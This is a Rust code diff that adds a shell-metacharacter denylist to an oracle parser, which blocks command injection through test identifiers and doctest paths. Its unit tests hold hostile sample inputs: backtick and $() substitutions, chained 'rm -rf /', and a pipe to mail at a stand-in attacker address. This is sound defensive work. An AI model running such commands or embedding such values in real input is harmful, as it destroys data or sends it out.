@@ -67,6 +67,38 @@ impl Oracle {
     }
 }
 
+/// Characters that let a value break out of shell quoting or trigger
+/// substitution, whatever style of quoting the `[oracle]` template used.
+///
+/// `test` and `doctest` oracles substitute their identifier unescaped into a
+/// command template (`oracle_exec::expand_test_template`) — the template is
+/// human-authored and trusted, but the identifier comes from the criterion,
+/// which can be agent-authored and is reviewed for EARS semantics and oracle
+/// *coverage*, not for shell-safety of a test name buried inside it. Without
+/// this, a criterion naming a test id that embeds a backtick-quoted shell
+/// command parses cleanly, passes G0, and runs the injected command the
+/// first time G2 executes that oracle.
+///
+/// Deliberately a denylist, not a character allowlist: real test identifiers
+/// use brackets (pytest parametrization), spaces (Jest descriptions) and
+/// asterisks, none of which alone achieve execution. What actually achieves
+/// it — command substitution, chaining, quote-breaking, escaping — is this
+/// fixed, small set, blocked regardless of whether the template quotes the
+/// placeholder.
+const SHELL_METACHARACTERS: &[char] =
+    &['`', '$', ';', '|', '&', '\'', '"', '\\', '\n', '\r', '\0'];
+
+fn reject_shell_metacharacters(field: &str, value: &str) -> Result<()> {
+    if let Some(c) = value.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
+        bail!(
+            "{field} `{value}` contains `{c}`, which a shell would treat specially — \
+             this oracle's identifier is substituted into a command template unescaped, \
+             so this could run as code rather than name a test. Remove it."
+        );
+    }
+    Ok(())
+}
+
 /// Parse the text after `oracle:`.
 pub fn parse(raw: &str) -> Result<Oracle> {
     let s = raw.trim();
@@ -88,6 +120,7 @@ pub fn parse(raw: &str) -> Result<Oracle> {
             if rest.is_empty() {
                 bail!("`test` oracle has no test identifier");
             }
+            reject_shell_metacharacters("test identifier", rest)?;
             Ok(Oracle::Test { id: rest.to_string() })
         }
         "schema" => {
@@ -104,7 +137,9 @@ pub fn parse(raw: &str) -> Result<Oracle> {
             if rest.is_empty() {
                 bail!("`doctest` oracle has no path");
             }
-            Ok(Oracle::Doctest { path: unquote(rest) })
+            let path = unquote(rest);
+            reject_shell_metacharacters("doctest path", &path)?;
+            Ok(Oracle::Doctest { path })
         }
         "human" => {
             if rest.is_empty() {
@@ -166,6 +201,59 @@ fn unquote(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_test_identifier_with_a_command_substitution_payload_is_rejected() {
+        let err = parse("test tests/x.rs::y`touch pwned`").unwrap_err().to_string();
+        assert!(err.contains('`'), "{err}");
+    }
+
+    #[test]
+    fn a_test_identifier_with_dollar_paren_is_rejected() {
+        let err = parse("test tests/x.rs::y$(touch pwned)").unwrap_err().to_string();
+        assert!(err.contains('$'), "{err}");
+    }
+
+    #[test]
+    fn a_test_identifier_with_a_semicolon_is_rejected() {
+        assert!(parse("test tests/x.rs::y; rm -rf /").is_err());
+    }
+
+    #[test]
+    fn a_test_identifier_with_a_pipe_is_rejected() {
+        assert!(parse("test tests/x.rs::y | mail me@evil.example").is_err());
+    }
+
+    #[test]
+    fn a_test_identifier_with_a_quote_is_rejected() {
+        assert!(parse("test tests/x.rs::y'; rm -rf /'").is_err());
+        assert!(parse(r#"test tests/x.rs::y"; rm -rf /""#).is_err());
+    }
+
+    #[test]
+    fn ordinary_test_identifiers_across_ecosystems_still_parse() {
+        // Rust
+        assert!(parse("test tests/trajectory.rs::one_json_object_per_line").is_ok());
+        // pytest, parametrized
+        assert!(parse("test tests/test_x.py::test_bar[param-1]").is_ok());
+        // Go
+        assert!(parse("test ./pkg/thing::TestServe").is_ok());
+        // Jest / mocha, a spaced description
+        assert!(parse("test src/x.test.js::renders the button when enabled").is_ok());
+        // Java/JUnit style dotted method
+        assert!(parse("test src/FooTest.java::FooTest.shouldServe").is_ok());
+    }
+
+    #[test]
+    fn a_doctest_path_with_an_injection_payload_is_rejected() {
+        assert!(parse("doctest src/lib.rs`touch pwned`").is_err());
+        assert!(parse("doctest `src/lib.rs; rm -rf /`").is_err());
+    }
+
+    #[test]
+    fn an_ordinary_doctest_path_still_parses() {
+        assert_eq!(parse("doctest src/lib.rs").unwrap(), Oracle::Doctest { path: "src/lib.rs".into() });
+    }
 
     #[test]
     fn parses_a_command_oracle() {
